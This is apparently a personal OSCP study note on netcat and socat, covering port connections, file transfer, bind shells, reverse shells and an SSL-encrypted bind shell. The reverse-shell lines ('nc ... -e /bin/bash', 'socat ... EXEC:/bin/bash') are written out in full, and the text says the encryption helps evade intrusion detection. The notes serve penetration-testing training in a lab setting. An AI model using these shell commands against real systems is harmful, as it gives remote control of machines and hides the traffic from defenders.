---
title: 'OSCP Note_ PRACTICAL TOOLS'
disqus: hackmd
---

OSCP Note_ PRACTICAL TOOLS
===

# PRACTICAL TOOLS
We often find ourselves in situations where the only tools available are those already installed on the target machine.

## Netcat
Netcat is one of the original penetration testing tools. Netcat reads and writes data across network connections using TCP or UDP protocols.

### – Connecting To a TCP/UDP Port
```
nc -n -v {Destination IP} {Destination port}
```
>-n： skip DNS name resolution\
>-v：詳細模式（verbose）輸出，顯示詳細的連接過程和調試訊息。

```
┌──(frankchang㉿CHW-Macbook)-[~]
└─$ nc -n -v 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server ready
```
> （110 port 通常用於 POP3 電子郵件協議）\
> 上面回應表示 Netcat 成功連接到目標 IP 地址 10.11.0.22 的 110 端口，並顯示了 POP3 服務器的歡迎訊息

**Try to interact with the server by attempting to authenticate as the Offsec user**

![image](https://hackmd.io/_uploads/rkfkLqLIR.png)

### – Listening On a TCP/UDP Port

```
rdesktop {Windows IP} -u {Windows User} -p {Windows password} -g 1024x768 -x 0x80
```
> -g 1024x768: RDP解析度為 1024x768 像素\
> -x 0x80: 指定RDP的體驗設置，0x80 代表低頻寬連接，會禁用一些高頻寬需求的功能以提高連接效率。

![image](https://hackmd.io/_uploads/r1IZJiU8R.png)

#### (In Windows RDP)
![image](https://hackmd.io/_uploads/r1cmmj8UR.png)
> 在 Windows 遠端桌面開4444 port
```
nc -nvlp {port}
```
>-n： skip DNS name resolution\
>-v：詳細模式（verbose）輸出，顯示詳細的連接過程和調試訊息\
>-l：進入「監聽」模式，等待傳入的連接\
> -p 4444：指定 Netcat 監聽的local port 為 4444

#### 1. Kali terminal send request
![image](https://hackmd.io/_uploads/ByPF4iIUR.png)
#### 2. Windows RDP
![image](https://hackmd.io/_uploads/HJda4iULA.png)

>[!Note]
> It's a important feature in netcat

### – Transferring Files with Netcat
Netcat can also be used to transfer files both text and binary.
#### (In Windows RDP)
```
nc -nvlp {port} > {exe name}.exe    #監聽
```
![image](https://hackmd.io/_uploads/BkFRFjLU0.png)

#### (In Kali terminal)
```
nc -nv {port} < {Transferred File's path}    #傳送檔案
```
![image](https://hackmd.io/_uploads/SkhLqs8U0.png)

#### (Back to Windows)
> Give the file enough time to transfer
```
{exe name}.exe -V
```
![image](https://hackmd.io/_uploads/rkviooUUC.png)
> change to **wget.exe** from Kali

### – Remote Administration with Netcat
```
man nc
```
#### (1) Netcat Bind Shell Scenario
![image](https://hackmd.io/_uploads/SJZeM3UUR.png)
![image](https://hackmd.io/_uploads/H1kbG28IA.png)
> Bob is running Windows\
> And Alice is running is running Linux.

![image](https://hackmd.io/_uploads/B1CQl6LIC.png)
> Bob needs his system and asked Alice to connect to his computer and issue some commands remotely.

##### (Bob: Windows)
IP: 10.11.0.22
```
nc -nvlp 4444 -e cmd.exe
```
> -e cmd.exe: 在連接建立後，執行 cmd.exe，這是 Windows 的命令行解釋

![image](https://hackmd.io/_uploads/HkXT76I8C.png)

##### (Alice: Kali)
```
nc -nv 10.11.0.22 4444
```
![image](https://hackmd.io/_uploads/r1FBE6UIA.png)
> 成功執行 Bob 的 cmd.exe (Kali 遠端執行 Windows 指令)

![image](https://hackmd.io/_uploads/SJ8K4aUU0.png)
> ipconfig 顯示 Bob 的IP

#### (2) Reverse Shell Scenario
Alice needs help from Bob.
![image](https://hackmd.io/_uploads/rk2BqA8LA.png)
> Alice 在內網\
> We can send control of Alice's command prompt to Bob.\
> (Reverse Shell)
##### (Bob: Windows) > Listen
IP: 10.11.0.22
```
nc -nvlp 4444 
```
![image](https://hackmd.io/_uploads/Hy1oj0LUA.png)
> Listen port 4444 for incoming shell

##### (Alice: Kali) > Send
Send reverse shell to Bob
```
nc -nv {Destination IP} {Destination port} -e /bin/bash
```
![image](https://hackmd.io/_uploads/HyUHn0UIR.png)
> -e /bin/bash: 在連接建立後，執行 /bin/bash，這是 Linux 的命令行解釋

##### Back to (Bob: Windows)
![image](https://hackmd.io/_uploads/rkfz6CL8C.png)
> 成功在 Windows 上遠端執行 Kali command

## Socat
Socat is a command-line utility that establishes bidirectional byte streams and transfers data between them.
```
socat - TCP4:10.11.0.22:110
```
> TCP4: 使用IPv4的TCP連接

![image](https://hackmd.io/_uploads/SyjMKDYIR.png)
> Interact with remote server

Next, let's look at how to start a listener with Socat.
```
sudo socat TCP4-LISTEN:443 STDOUT
```
> 在local 443 port 監聽 IPv4 的 TCP 封包

(Connect between Windows & Linux)\
![image](https://hackmd.io/_uploads/H1r0qcF8R.png)
![image](https://hackmd.io/_uploads/H1kZo5Y8C.png)
### - Socat File Transfers
Assume Alice needs to send BOB a file called secret_passwords.txt
#### Alice side
```
┌──(frankchang㉿CHW-Macbook)-[~]
└─$ tail /usr/share/wordlists/nmap.lst  > secret_passwords.txt    

# nmap.lst  塞進secret_passwords.txt

┌──(frankchang㉿CHW-Macbook)-[~]
└─$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

# 當有連接進來並發送數據時，這些數據會被寫入 secret_passwords.txt 文件
```
/usr/share/wordlists/nmap.lst 內容: 
```
└─$ cat /usr/share/wordlists/nmap.lst
#!comment: This collection of data is (C) 1996-2022 by Nmap Software LLC.
#!comment: It is distributed under the Nmap Public Source license as
#!comment: provided in the LICENSE file of the source distribution or at
#!comment: https://nmap.org/npsl/.  Note that this license
#!comment: requires you to license your own work under a compatable open source
#!comment: license.  If you wish to embed Nmap technology into proprietary
#!comment: software, we sell alternative licenses at https://nmap.org/oem/.

123456
12345
123456789
password
iloveyou
princess
```
#### Bob side
Alice IP: **10.11.0.4:443**
```
socat TCP:10.11.0.4:443 file:received_secret_passwords.txt,create
```
> 建立一個 TCP 連接到目標 IP 地址 10.11.0.4 port 443，並將接收到的數據寫入到 received_secret_passwords.txt

![image](https://hackmd.io/_uploads/SJnMbjYIA.png)
> 成功連接，Bob 收到 Alice 的 /usr/share/wordlists/nmap.lst (received_secret_passwords.txt)

### - Socat Reverse Shells
Bob will start a listener on port 443.
```
┌──(frankchang㉿CHW-Macbook)-[~]
└─$ sudo socat -d -d TCP4-LISTEN:443 STDOUT
2024/06/27 17:39:28 socat[71] N listening on AF=2 0.0.0.0:443

```
> -d -d：啟用兩級的調試訊息，會print 詳細的輸出，包括連接建立和data傳輸的訊息。

Alice will use socat's exec option. It's similar to the **NETCAT -e**
- Bob IP: 10.11.0.22
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```
> EXEC:/bin/bash: 建立後執行 /bin/bash，將STDIN/STDOUT 重定向到該ip。

ONCE CONNECTED, Bob can enter commands from his socat session, which will execute on Alice's machine.
![image](https://hackmd.io/_uploads/Hy28O2q8R.png)
> Bob 成功控制 Alice 電腦

### – Socat Encrypted Bind Shells
To add encryption to a bind shell, we'll rely on secure socket layer certificates.
This level of encryption will assist in envading intrusion detection systems. And will help hide the sensitive data we are transceiving.
We will use the openssl application, to create a self-signed certificate using the following options
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
> openssl 生成一個新的 RSA 私鑰和自簽憑證
> `req & -x509`: 生成證書簽名請求（CSR）和自簽憑證\
> `-newkey rsa`:2048 生成一個新的 RSA 私鑰，密鑰長度為 2048 位元\
> `-nodes`: 儲存私鑰的時候不加密，即不使用密碼保護\
> `-keyout bind_shell.key`: 生成私鑰檔案 bind_shell.key\
> `-days 362`: 簽證期限 362 天\
> `-out bind_shell.crt`: 生成的自簽憑證 bind_shell.crt

![image](https://hackmd.io/_uploads/rkdo6A5UC.png)\
(自簽憑證資訊可以參考另一篇: [Apache SSL 憑證申請安裝](https://github.com/Chw41/Server-conf./blob/main/Secure%20Sockets%20Layer/README.md#1-%E7%94%A2%E7%94%9Frsa-%E7%A7%81%E9%91%B0))

After key and certificate have been generated,
we need to convert them into a format socat will accept.
![image](https://hackmd.io/_uploads/rJA9PyoL0.png)
```
cat {key file} {.crt file} > {.pem file}
```
> 將私鑰和憑證合併成 PEM

>[!Important]
> .crt 和 .pem 差別,
> - .crt: 通常只包含憑證本人 (Binary 格式)
> - .pem: 可以包含多種類型的加密資料 ex. PRIVATE KEY, PUBLIC KEY, CERTIFICATE ( ASCII 編碼的 Base64 格式)

#### 2. Create socat listener
Now let's create the encrypted socat listener
```
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
> `cert=bind_shell.pem`: 使用 bind_shell.pem 中的證書和私鑰來進行加密通訊\
> `verify=0`: 不驗證對方的certificate，允許所有連接\
> `fork`: 當每個新連接，fork 出一個child process來處理，允許多個連線

**(Bob Mode)**
- Alice IP: 10.11.0.4
```
socat - OPENSSL:10.11.0.4:443,verify=0
```
![image](https://hackmd.io/_uploads/ByVghyiUC.png)
> Bob 成功控制 Alice 電腦

## Powershell And Powercat
